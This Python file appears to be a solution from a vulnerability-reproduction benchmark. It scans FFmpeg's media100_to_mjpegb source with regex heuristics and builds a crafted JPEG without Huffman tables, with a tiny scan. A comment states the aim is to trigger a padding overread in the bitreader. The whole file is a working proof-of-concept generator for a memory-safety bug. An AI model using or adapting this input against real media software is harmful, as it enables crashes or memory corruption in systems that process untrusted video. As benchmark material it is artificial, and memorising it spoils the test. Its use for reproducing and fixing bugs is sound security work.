import os
import re
import tarfile
from typing import Optional, Tuple, List


def _read_text_from_tar_member(t: tarfile.TarFile, m: tarfile.TarInfo, max_bytes: int = 2_000_000) -> str:
    f = t.extractfile(m)
    if not f:
        return ""
    data = f.read(max_bytes)
    try:
        return data.decode("utf-8", "ignore")
    except Exception:
        return data.decode("latin-1", "ignore")


def _find_media100_source_text(src_path: str) -> str:
    if os.path.isdir(src_path):
        best = None
        for root, _, files in os.walk(src_path):
            for fn in files:
                lfn = fn.lower()
                if "media100_to_mjpegb" in lfn and (lfn.endswith(".c") or lfn.endswith(".h")):
                    best = os.path.join(root, fn)
                    break
            if best:
                break
        if not best:
            for root, _, files in os.walk(src_path):
                for fn in files:
                    lfn = fn.lower()
                    if lfn.endswith(".c") or lfn.endswith(".h"):
                        p = os.path.join(root, fn)
                        try:
                            with open(p, "rb") as f:
                                data = f.read(1_000_000)
                            if b"media100_to_mjpegb" in data or b"media100" in data:
                                return data.decode("utf-8", "ignore")
                        except Exception:
                            continue
            return ""
        try:
            with open(best, "rb") as f:
                return f.read().decode("utf-8", "ignore")
        except Exception:
            return ""

    if not os.path.isfile(src_path):
        return ""

    try:
        with tarfile.open(src_path, "r:*") as t:
            members = [m for m in t.getmembers() if m.isfile()]
            # Prefer by filename
            for m in members:
                n = m.name.lower()
                if "media100_to_mjpegb" in n and (n.endswith(".c") or n.endswith(".h")):
                    return _read_text_from_tar_member(t, m)
            # Fallback: scan .c/.h for the symbol
            for m in members:
                n = m.name.lower()
                if not (n.endswith(".c") or n.endswith(".h")):
                    continue
                txt = _read_text_from_tar_member(t, m, max_bytes=1_000_000)
                if "media100_to_mjpegb" in txt or "media100" in txt:
                    return txt
    except Exception:
        return ""
    return ""


def _parse_tag_macro_args(args: str) -> Optional[bytes]:
    # Extract 4 characters from 'A','B','C','D' or 0x.. style
    parts = [p.strip() for p in args.split(",")]
    if len(parts) < 4:
        return None
    out = bytearray()
    for i in range(4):
        p = parts[i]
        m = re.match(r"^'(.)'$", p)
        if m:
            out.append(ord(m.group(1)))
            continue
        m = re.match(r"^0x([0-9a-fA-F]{1,2})$", p)
        if m:
            out.append(int(m.group(1), 16))
            continue
        m = re.match(r"^(\d+)$", p)
        if m:
            v = int(m.group(1))
            if 0 <= v <= 255:
                out.append(v)
                continue
        return None
    return bytes(out)


def _detect_write_marker(code: str, marker16: int) -> bool:
    # marker16 like 0xFFD8 or 0xFFD9
    hexv = f"{marker16:04x}"
    hi = hexv[:2]
    lo = hexv[2:]
    patterns = [
        rf"\*\s*\w+\s*\+\+\s*=\s*0x{hi}\s*;\s*\*\s*\w+\s*\+\+\s*=\s*0x{lo}\s*;",
        rf"\*\s*\w+\s*\+\+\s*=\s*0x{hi}\s*;[^\n\r]{{0,80}}\*\s*\w+\s*\+\+\s*=\s*0x{lo}\s*;",
        rf"(?:AV_W[BL]16|bytestream2_put_be16|bytestream2_put_le16)\s*\([^,]+,\s*0x{hexv}\s*\)",
        rf"(?:AV_W[BL]16|bytestream2_put_be16|bytestream2_put_le16)\s*\([^,]+,\s*0x{hexv.upper()}\s*\)",
        rf"\{{\s*0x{hi}\s*,\s*0x{lo}\s*\}}",
        rf"\{{\s*0x{hi.upper()}\s*,\s*0x{lo.upper()}\s*\}}",
    ]
    for pat in patterns:
        if re.search(pat, code, re.IGNORECASE | re.DOTALL):
            return True
    return False


def _detect_check_marker_offset(code: str, marker16: int) -> Optional[int]:
    hexv = f"{marker16:04x}"
    # AV_RB16(pkt->data + off) == 0xffd8
    m = re.search(
        rf"AV_R[BL]16\s*\(\s*pkt->data\s*(?:\+\s*(\d+)\s*)?\)\s*[!=]=\s*0x{hexv}\b",
        code,
        re.IGNORECASE,
    )
    if m:
        off = m.group(1)
        return int(off) if off else 0
    # bytestream get check
    m = re.search(
        rf"AV_R[BL]16\s*\(\s*\w+\s*(?:\+\s*(\d+)\s*)?\)\s*[!=]=\s*0x{hexv}\b",
        code,
        re.IGNORECASE,
    )
    if m:
        off = m.group(1)
        return int(off) if off else 0
    # pkt->data[i] == 0xff and pkt->data[i+1] == 0xd8
    hi = (marker16 >> 8) & 0xFF
    lo = marker16 & 0xFF
    # Find lines/blocks with both indices
    for m in re.finditer(r"pkt->data\[(\d+)\].{0,120}?0x([0-9a-fA-F]{1,2})", code, re.IGNORECASE | re.DOTALL):
        idx = int(m.group(1))
        val = int(m.group(2), 16)
        if val == hi:
            # try to find idx+1 with lo nearby
            pat2 = rf"pkt->data\[{idx+1}\].{{0,120}}?0x{lo:02x}\b"
            if re.search(pat2, code, re.IGNORECASE | re.DOTALL):
                return idx
    return None


def _detect_tag_requirement(code: str) -> Optional[Tuple[int, bytes, str]]:
    # Returns (offset, tagbytes, endian) where endian in {"be","le"}
    # Match: AV_RB32(pkt->data + off) != MKBETAG('A','B','C','D')
    m = re.search(
        r"AV_R([BL])32\s*\(\s*pkt->data\s*(?:\+\s*(\d+)\s*)?\)\s*[!=]=\s*(MKBETAG|MKTAG)\s*\(([^)]{3,80})\)",
        code,
        re.IGNORECASE,
    )
    if not m:
        return None
    end = m.group(1).upper()
    off = int(m.group(2)) if m.group(2) else 0
    macro = m.group(3).upper()
    args = m.group(4)
    tag = _parse_tag_macro_args(args)
    if not tag or len(tag) != 4:
        return None
    # Interpret macro + read endian to determine memory bytes expected
    if macro == "MKBETAG":
        tag_be = tag
    else:
        # MKTAG builds little-endian constant from chars (commonly), but in memory expectation depends on read endian.
        # For our purposes, construct both and decide by read endian.
        tag_be = tag

    if end == "B":
        # AV_RB32 reads big-endian from memory: memory bytes must equal tag_be
        return (off, tag_be, "be")
    else:
        # AV_RL32 reads little-endian from memory: memory bytes are reversed
        return (off, tag_be[::-1], "le")


def _build_jpeg_without_dht(include_soi: bool, include_eoi: bool, scan_bytes: bytes) -> bytes:
    # Standard-ish minimal baseline JPEG for 16x8, 4:2:2 sampling, no DHT.
    lum_q = [
        16, 11, 10, 16, 24, 40, 51, 61,
        12, 12, 14, 19, 26, 58, 60, 55,
        14, 13, 16, 24, 40, 57, 69, 56,
        14, 17, 22, 29, 51, 87, 80, 62,
        18, 22, 37, 56, 68, 109, 103, 77,
        24, 35, 55, 64, 81, 104, 113, 92,
        49, 64, 78, 87, 103, 121, 120, 101,
        72, 92, 95, 98, 112, 100, 103, 99,
    ]
    chr_q = [
        17, 18, 24, 47, 99, 99, 99, 99,
        18, 21, 26, 66, 99, 99, 99, 99,
        24, 26, 56, 99, 99, 99, 99, 99,
        47, 66, 99, 99, 99, 99, 99, 99,
        99, 99, 99, 99, 99, 99, 99, 99,
        99, 99, 99, 99, 99, 99, 99, 99,
        99, 99, 99, 99, 99, 99, 99, 99,
        99, 99, 99, 99, 99, 99, 99, 99,
    ]

    out = bytearray()
    if include_soi:
        out += b"\xFF\xD8"

    # DQT with 2 tables
    dqt_payload = bytearray()
    dqt_payload.append(0x00)  # 8-bit, table 0
    dqt_payload += bytes(lum_q)
    dqt_payload.append(0x01)  # 8-bit, table 1
    dqt_payload += bytes(chr_q)
    dqt_len = 2 + len(dqt_payload)
    out += b"\xFF\xDB" + dqt_len.to_bytes(2, "big") + dqt_payload

    # SOF0
    # 16x8, 3 components, Y 4:2:2
    sof_payload = bytearray()
    sof_payload.append(8)  # precision
    sof_payload += (8).to_bytes(2, "big")   # height
    sof_payload += (16).to_bytes(2, "big")  # width
    sof_payload.append(3)  # components
    sof_payload += bytes([1, 0x21, 0])  # Y, H2 V1, QT0
    sof_payload += bytes([2, 0x11, 1])  # Cb, QT1
    sof_payload += bytes([3, 0x11, 1])  # Cr, QT1
    sof_len = 2 + len(sof_payload)
    out += b"\xFF\xC0" + sof_len.to_bytes(2, "big") + sof_payload

    # SOS
    sos_payload = bytearray()
    sos_payload.append(3)  # components
    sos_payload += bytes([1, 0x00])  # Y: DC0/AC0
    sos_payload += bytes([2, 0x11])  # Cb: DC1/AC1
    sos_payload += bytes([3, 0x11])  # Cr: DC1/AC1
    sos_payload += bytes([0, 63, 0])  # Ss, Se, AhAl
    sos_len = 2 + len(sos_payload)
    out += b"\xFF\xDA" + sos_len.to_bytes(2, "big") + sos_payload

    # Entropy-coded data (very short on purpose)
    out += scan_bytes

    if include_eoi:
        out += b"\xFF\xD9"

    return bytes(out)


def _analyze_media100_source(code: str) -> Tuple[int, Optional[Tuple[int, bytes]], bool, bool, bool, bool]:
    # Returns:
    # jpeg_off, tag_req (off, bytes), include_soi, include_eoi, force_no_dht (always true), ok
    if not code:
        return 0, None, True, True, True, False

    # Tag requirement (heuristic)
    tag_req = _detect_tag_requirement(code)

    # Check for where SOI is expected in input
    soi_off = _detect_check_marker_offset(code, 0xFFD8)
    eoi_off = _detect_check_marker_offset(code, 0xFFD9)

    # Detect if code writes SOI/EOI into output (heuristic)
    write_soi = _detect_write_marker(code, 0xFFD8)
    write_eoi = _detect_write_marker(code, 0xFFD9)

    # Detect if code seems to check for SOI/EOI
    check_soi = soi_off is not None
    check_eoi = eoi_off is not None

    include_soi = True
    include_eoi = True
    if write_soi and not check_soi:
        include_soi = False
    if write_eoi and not check_eoi:
        include_eoi = False

    # Decide jpeg offset:
    # Prefer explicit SOI check offset, else if a tag is required at offset 0, jpeg likely after it.
    jpeg_off = 0
    if soi_off is not None:
        jpeg_off = soi_off
    elif tag_req is not None and tag_req[0] == 0:
        jpeg_off = 4

    # If tag requirement conflicts with SOI at 0, ignore tag requirement.
    if tag_req is not None and tag_req[0] == 0 and jpeg_off == 0:
        # unlikely to be a real input constraint; drop it
        tag_req = None

    # If tag at some offset overlaps jpeg start, move jpeg start after tag.
    if tag_req is not None:
        tag_off, tag_bytes, _endian = tag_req
        if jpeg_off < tag_off + len(tag_bytes):
            jpeg_off = tag_off + len(tag_bytes)

    return jpeg_off, (tag_req[0], tag_req[1]) if tag_req is not None else None, include_soi, include_eoi, True, True


class Solution:
    def solve(self, src_path: str) -> bytes:
        code = _find_media100_source_text(src_path)
        jpeg_off, tag_req, include_soi, include_eoi, _force_no_dht, _ok = _analyze_media100_source(code)

        # Keep scan very short, EOI at end (if included) to maximize chance of padding overread by bitreader.
        scan_bytes = b"\x00"

        jpeg = _build_jpeg_without_dht(include_soi=include_soi, include_eoi=include_eoi, scan_bytes=scan_bytes)

        prefix_len = max(0, int(jpeg_off))
        if tag_req is not None:
            prefix_len = max(prefix_len, tag_req[0] + len(tag_req[1]))

        buf = bytearray(prefix_len + len(jpeg))
        # Apply tag requirement if any
        if tag_req is not None:
            off, tb = tag_req
            if 0 <= off <= len(buf) - len(tb):
                buf[off:off + len(tb)] = tb

        # Place jpeg at jpeg_off
        if 0 <= jpeg_off <= len(buf) - len(jpeg):
            buf[jpeg_off:jpeg_off + len(jpeg)] = jpeg
        else:
            # fallback: append
            buf = bytearray(jpeg)

        return bytes(buf)